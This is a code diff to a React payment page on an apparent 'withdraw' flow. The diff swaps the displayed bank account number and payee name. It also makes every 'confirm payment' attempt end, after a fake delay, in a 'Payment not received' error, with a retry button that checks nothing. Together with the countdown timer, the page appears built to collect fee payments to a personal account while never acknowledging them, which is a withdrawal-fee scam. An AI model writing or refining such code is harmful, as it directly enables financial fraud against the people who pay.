@@ -12,6 +12,7 @@ export default function PaymentPage() {
   const [minutes, setMinutes] = useState(7)
   const [seconds, setSeconds] = useState(43)
   const [isLoading, setIsLoading] = useState(false)
+  const [showError, setShowError] = useState(false)
   const [selectedFile, setSelectedFile] = useState<File | null>(null)
   const [copiedText, setCopiedText] = useState("")
 
@@ -30,6 +31,7 @@ export default function PaymentPage() {
     return () => clearInterval(timer)
   }, [minutes, seconds])
 
+  // Update the handleConfirmPayment function to check for receipt upload
   const handleConfirmPayment = () => {
     if (!selectedFile) {
       alert("Please upload your payment receipt before confirming payment")
@@ -40,8 +42,21 @@ export default function PaymentPage() {
 
     setTimeout(() => {
       setIsLoading(false)
-      router.push("/withdraw/payment/error")
+      setShowError(true)
     }, 3000)
+  }
+
+  const handleRetry = () => {
+    setIsLoading(true)
+
+    setTimeout(() => {
+      setIsLoading(false)
+      setShowError(false)
+    }, 2000)
+  }
+
+  const handleCancel = () => {
+    router.push("/withdraw/pin")
   }
 
   const copyToClipboard = (text: string) => {
@@ -90,20 +105,20 @@ export default function PaymentPage() {
           <div className="flex justify-between items-center">
             <p className="text-white flex items-center">
               <span className="bg-blue-500 text-white px-1 mr-2 text-xs">🏦</span>
-              Acc : 5013131885
+              Acc : 6955661131
             </p>
             <button
-              onClick={() => copyToClipboard("5013131885")}
+              onClick={() => copyToClipboard("6955661131")}
               className="text-green-500 hover:text-green-400"
               title="Copy account number"
             >
               <Copy size={16} />
             </button>
           </div>
-          {copiedText === "5013131885" && <p className="text-green-500 text-xs mt-1">Account number copied!</p>}
+          {copiedText === "6955661131" && <p className="text-green-500 text-xs mt-1">Account number copied!</p>}
           <p className="text-white flex items-center mt-2">
             <span className="bg-blue-500 text-white px-1 mr-2 text-xs">👤</span>
-            Name : Jonathan Akuso Ishaya
+            Name : Daniel John
           </p>
           <p className="text-white flex items-center mt-2">
             <span className="bg-blue-500 text-white px-1 mr-2 text-xs">🏦</span>
@@ -141,6 +156,24 @@ export default function PaymentPage() {
           CONFIRM PAYMENT
         </button>
       </div>
+
+      {/* Error Popup */}
+      {showError && (
+        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+          <div className="bg-white p-6 rounded-lg w-full max-w-xs">
+            <h2 className="text-xl font-bold text-red-500 mb-4">Bad Request</h2>
+            <p className="text-gray-700 mb-6">Payment not received. Please check your payment details and try again.</p>
+            <div className="flex justify-end space-x-3">
+              <button onClick={handleCancel} className="px-4 py-2 bg-gray-200 text-gray-800 rounded-md">
+                Cancel
+              </button>
+              <button onClick={handleRetry} className="px-4 py-2 bg-green-500 text-white rounded-md">
+                Retry
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
 
       {isLoading && <LoadingOverlay />}
     </main>
